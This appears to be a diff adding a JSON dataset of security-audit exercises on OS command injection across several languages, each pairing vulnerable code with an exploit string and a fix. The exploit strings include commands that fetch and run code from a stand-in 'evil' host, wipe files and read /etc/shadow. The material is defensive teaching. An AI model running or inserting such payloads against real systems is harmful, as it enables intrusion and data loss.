@@ -1,0 +1,82 @@
+[
+  {
+    "instruction": "Audit this code for security issues:\n\nimport os\nname = request.args['file']\nos.system('cp ' + name + ' /backup/')",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** `name` is concatenated into a shell command executed by `os.system`.\n**Exploit:** `file = \"x; rm -rf /\"` or `\"x && curl evil|sh\"`.\n**Fix:**\nimport subprocess, shlex\nsubprocess.run(['cp', name, '/backup/'], check=True)  # no shell, args as a list"
+  },
+  {
+    "instruction": "Audit this code for security issues:\n\nimport subprocess\nhost = request.form['host']\nsubprocess.call('ping -c 1 ' + host, shell=True)",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** The command is built by string concatenation and run with `shell=True`.\n**Exploit:** `host = \"127.0.0.1; cat /etc/passwd\"`.\n**Fix:**\nsubprocess.run(['ping', '-c', '1', host], check=True)  # list args, shell=False"
+  },
+  {
+    "instruction": "Audit this code for security issues (Node/JS):\n\nconst { exec } = require('child_process');\nexec('convert ' + req.query.img + ' out.png');",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** `req.query.img` is interpolated into a shell string.\n**Exploit:** `img = \"a.png; rm -rf ~\"`.\n**Fix:**\nconst { execFile } = require('child_process');\nexecFile('/usr/bin/convert', [req.query.img, 'out.png']);"
+  },
+  {
+    "instruction": "Audit this code for security issues:\n\nimport os\ndir = request.args.get('dir')\noutput = os.popen(f'ls -la {dir}').read()",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** `dir` is embedded into a command string passed to a shell.\n**Exploit:** `dir = \".; cat /etc/shadow\"`.\n**Fix:**\nimport subprocess\noutput = subprocess.run(['ls', '-la', dir], capture_output=True, text=True).stdout"
+  },
+  {
+    "instruction": "Audit this code for security issues (PHP):\n\n$file = $_GET['file'];\nsystem(\"gzip \" . $file);",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** `$_GET['file']` is concatenated into a shell command.\n**Exploit:** `?file=a;id` or backticks to run arbitrary commands.\n**Fix:**\n$file = escapeshellarg($_GET['file']);\nsystem(\"gzip \" . $file);\n// Prefer a non-shell API when available."
+  },
+  {
+    "instruction": "Audit this code for security issues:\n\nfilename = request.json['name']\nsubprocess.run(f'pdftotext /tmp/{filename} -', shell=True)",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** `shell=True` with an f-string lets the filename break out.\n**Exploit:** `name = \"x; wget evil -O-|sh\"`.\n**Fix:**\nsubprocess.run(['pdftotext', f'/tmp/{filename}', '-'], check=True)"
+  },
+  {
+    "instruction": "Audit this code for security issues (Ruby):\n\nname = params[:name]\n`echo Hello #{name}`",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** Backticks execute a shell command with interpolated, untrusted input.\n**Exploit:** `name = \"x; cat /etc/passwd\"`.\n**Fix:**\nsystem('echo', \"Hello #{name}\")  # argument form avoids the shell\n# or Shellwords.escape(name) if a shell string is unavoidable"
+  },
+  {
+    "instruction": "Audit this code for security issues (Python, shell pipeline):\n\ndef convert(request):\n    fmt = request.GET['fmt']\n    os.system(f'ffmpeg -i in.mp4 out.{fmt}')\n    return ok()",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** The format string is inserted into a shell command.\n**Exploit:** `fmt = \"mp4; curl evil|sh; #\"`.\n**Fix:**\nALLOWED = {\"mp4\", \"webm\", \"mkv\"}\nif fmt not in ALLOWED:\n    return bad_request()\nsubprocess.run(['ffmpeg', '-i', 'in.mp4', f'out.{fmt}'], check=True)"
+  },
+  {
+    "instruction": "Audit this code for security issues (JS):\n\nconst cmd = `git checkout ${req.body.branch}`;\nexecSync(cmd);",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** The branch name flows into a shell command string.\n**Exploit:** `branch = \"main; rm -rf .git\"`.\n**Fix:**\nconst { execFileSync } = require('child_process');\n// validate against a ref allow-list first\nif (!/^[A-Za-z0-9._\\/-]+$/.test(req.body.branch)) throw new Error('bad branch');\nexecFileSync('git', ['checkout', req.body.branch]);"
+  },
+  {
+    "instruction": "Audit this code for security issues:\n\nimport shlex\nuser_input = request.args.get('q')\ncommand = '/usr/bin/search ' + user_input\nos.system(command)",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** Despite the `shlex` import, the input is not quoted and `os.system` uses a shell.\n**Exploit:** `q = \"x; id\"`.\n**Fix:**\nsubprocess.run(['/usr/bin/search', user_input], check=True)"
+  },
+  {
+    "instruction": "Audit this code for security issues (Python):\n\npath = request.args['path']\nsubprocess.call('tar czf backup.tgz ' + path, shell=True)",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** The path is concatenated and run through a shell.\n**Exploit:** `path = \". --checkpoint=1 --checkpoint-action=exec=sh evil.sh\"` (tar exec trick) or `; rm -rf /`.\n**Fix:**\nsubprocess.run(['tar', 'czf', 'backup.tgz', path], check=True)"
+  },
+  {
+    "instruction": "Audit this code for security issues (log processing):\n\ndate = request.form['date']\nos.system(f\"grep {date} /var/log/app.log | mail -s report admin@example.com\")",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** High\n**Why:** `date` is embedded in a shell pipeline.\n**Exploit:** `date = \"x; curl evil|sh; echo\"`.\n**Fix:**\nimport re, subprocess\nif not re.fullmatch(r'\\d{4}-\\d{2}-\\d{2}', date):\n    return bad_request()\nmatches = subprocess.run(['grep', date, '/var/log/app.log'], capture_output=True, text=True).stdout\n# then send via a mail API/library"
+  },
+  {
+    "instruction": "Audit this code for security issues (Go):\n\nexec.Command(\"sh\", \"-c\", \"cp \"+name+\" /data/\").Run()",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** Spawning `sh -c` with a concatenated `name` gives full shell interpretation.\n**Exploit:** `name = \"x; rm -rf /data\"`.\n**Fix:**\nexec.Command(\"cp\", name, \"/data/\").Run()"
+  },
+  {
+    "instruction": "Audit this code for security issues (PHP):\n\n$dir = $_POST['dir'];\npassthru('du -sh ' . $dir);",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** `passthru` runs a shell with the concatenated `$dir`.\n**Exploit:** `dir = \"/; cat /etc/passwd\"`.\n**Fix:**\n$dir = escapeshellarg($_POST['dir']);\npassthru('du -sh ' . $dir);"
+  },
+  {
+    "instruction": "Audit this code for security issues (CI helper):\n\nrepo = request.json['repo']\nsubprocess.check_output(f'git clone {repo} /tmp/repo', shell=True)",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** The repository string can include shell metacharacters.\n**Exploit:** `repo = \"https://x/repo; rm -rf /tmp/*\"` or an ext-protocol like `ext::sh -c evil`.\n**Fix:**\nif not re.match(r'^https://[\\w./-]+$', repo):\n    return bad_request()\nsubprocess.check_output(['git', 'clone', repo, '/tmp/repo'])"
+  },
+  {
+    "instruction": "Audit this code for security issues (Windows batch):\n\nSet user=%1\ncall run.bat %user%",
+    "output": "**Vulnerability:** Command injection\n**Severity:** High\n**Why:** Unquoted argument expansion allows `&`, `|`, `>` to inject commands.\n**Exploit:** `run.bat \"x & del C:\\important\"`.\n**Fix:**\n# Validate/allow-list the argument and quote it:\nSet \"user=%~1\"\nif not \"%user%\"==\"%user:&= %\" exit /b 1\ncall run.bat \"%user%\""
+  },
+  {
+    "instruction": "Audit this code for security issues (image resize):\n\nsize = request.args['size']\nos.system('convert in.jpg -resize ' + size + ' out.jpg')",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** High\n**Why:** `size` is concatenated into a shell command.\n**Exploit:** `size = \"100x100; cat /etc/passwd > out.jpg\"`.\n**Fix:**\nimport re\nif not re.fullmatch(r'\\d+x\\d+', size):\n    return bad_request()\nsubprocess.run(['convert', 'in.jpg', '-resize', size, 'out.jpg'], check=True)"
+  },
+  {
+    "instruction": "Audit this code for security issues (Python):\n\nquery = request.args.get('q', '')\nresult = subprocess.check_output('grep \"%s\" data.txt' % query, shell=True)",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** The value is formatted into a shell string with `shell=True`; the surrounding quotes don't stop `$(...)` or backticks.\n**Exploit:** `q = 'x$(whoami)'` or `'x`id`'`.\n**Fix:**\nresult = subprocess.check_output(['grep', query, 'data.txt'])"
+  },
+  {
+    "instruction": "Audit this code for security issues (network tool):\n\nport = request.form['port']\nos.system('nc -zv ' + host + ' ' + port)",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** Both `host` and `port` are concatenated into a shell command.\n**Exploit:** `port = \"80; id\"` or `host = \"x; curl evil|sh\"`.\n**Fix:**\nif not port.isdigit() or not (0 < int(port) < 65536):\n    return bad_request()\nsubprocess.run(['nc', '-zv', host, port], check=True)"
+  },
+  {
+    "instruction": "Audit this code for security issues (Python):\n\narchive = request.args['name']\nos.system('zip -r /tmp/' + archive + '.zip .')",
+    "output": "**Vulnerability:** OS command injection\n**Severity:** Critical\n**Why:** `archive` is concatenated into a shell command.\n**Exploit:** `name = \"x; cat /etc/passwd #\"`.\n**Fix:**\nif not re.fullmatch(r'[A-Za-z0-9_-]+', archive):\n    return bad_request()\nsubprocess.run(['zip', '-r', f'/tmp/{archive}.zip', '.'], check=True)"
+  }
+]
